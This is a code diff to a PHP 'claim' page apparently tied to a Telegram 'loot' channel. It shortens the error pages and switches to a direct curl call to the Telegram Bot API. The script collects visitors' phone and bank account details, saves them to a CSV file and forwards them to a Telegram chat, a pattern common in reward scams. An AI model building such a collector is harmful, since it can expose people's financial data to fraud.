@@ -27,72 +27,14 @@ if (file_exists($csv_file)) {
 
 // ----------------- CHECK IF SAME BANK USED -----------------
 if ($already_claimed) {
-    echo "<!DOCTYPE html>
-    <html lang='en'>
-    <head>
-    <meta charset='UTF-8'>
-    <title>Duplicate Bank</title>
-    <style>
-    body {
-        margin: 0;
-        font-family: 'Inter', sans-serif;
-        background: linear-gradient(135deg,#0f1722,#0b3b2e);
-        color: #fff;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .popup {
-        background: rgba(0,0,0,0.85);
-        padding: 50px;
-        border-radius: 20px;
-        text-align: center;
-        box-shadow: 0 10px 50px rgba(0,0,0,0.7);
-        max-width: 700px;
-    }
-    h1 {
-        color: #f1c40f;
-        font-size: 48px;
-        margin-bottom: 20px;
-    }
-    p {
-        font-size: 24px;
-        margin: 10px 0;
-    }
-    </style>
-    </head>
-    <body>
-    <div class='popup'>
-        <h1>⚠ 1 Bank 1 Time!</h1>
-        <p>Try another bank account.</p>
-    </div>
-    </body>
-    </html>";
-    exit();
+    http_response_code(400); // Optional: send error code
+    exit("⚠ 1 Bank 1 Time! Try another bank account.");
 }
 
 // ----------------- CHECK LIMIT -----------------
 if ($total_claims >= $total_claim_limit) {
-    echo "<!DOCTYPE html>
-    <html lang='en'>
-    <head><meta charset='UTF-8'><title>Limit Reached</title>
-    <style>
-    body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
-    .container{background:rgba(0,0,0,0.85);padding:40px;border-radius:15px;width:100%;max-width:600px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.6);}
-    h1{color:#e74c3c;font-size:48px;margin-bottom:20px;}
-    p{font-size:22px;}
-    </style>
-    </head>
-    <body>
-    <div class='container'>
-    <h1>⚠ Claim Limit Reached!</h1>
-    <p>Sorry, all claims have been completed.</p>
-    <p>Total Claims: $total_claims / $total_claim_limit</p>
-    </div>
-    </body>
-    </html>";
-    exit();
+    http_response_code(400);
+    exit("⚠ Claim Limit Reached! Total Claims: $total_claims / $total_claim_limit");
 }
 
 // ----------------- SAVE TO CSV -----------------
@@ -102,22 +44,39 @@ fputcsv($f, $line);
 fclose($f);
 
 // ----------------- TELEGRAM ALERT -----------------
-$message = "📱 Phone: $phone\n"
-         . "🏦 Account: $account_no\n"
-         . "🔢 IFSC: $ifsc_code\n"
-         . "💰 Claim: $claim\n"
-         . "🕒 Time: $time\n"
-         . "📍 Total Claims So Far: " . ($total_claims + 1);
+// Send message directly via Telegram Bot API
+$telegram_message = "📱 Phone: $phone\n"
+                  . "🏦 Account: $account_no\n"
+                  . "🔢 IFSC: $ifsc_code\n"
+                  . "💰 Claim: $claim\n"
+                  . "🕒 Time: $time\n"
+                  . "📍 Total Claims So Far: " . ($total_claims + 1);
 
-$relay_url = $telegram_relay_url . "?chat_id=" . $chat_id . "&msg=" . urlencode($message);
-file_get_contents($relay_url);
+// Telegram Bot API URL
+$telegram_api_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
+$params = [
+    'chat_id' => $chat_id,
+    'text'    => $telegram_message,
+    'parse_mode' => 'HTML'
+];
+
+// Use curl to send message (more reliable than file_get_contents on Render)
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Prevent hanging
+$result = curl_exec($ch);
+curl_close($ch);
+
+// ----------------- REDIRECT / SUCCESS PAGE -----------------
+header("Refresh:3; url=https://t.me/EARNPAYTMLOOT0");
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="refresh" content="3;url=https://t.me/EARNPAYTMLOOT0">
 <title>Success</title>
 <style>
 body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
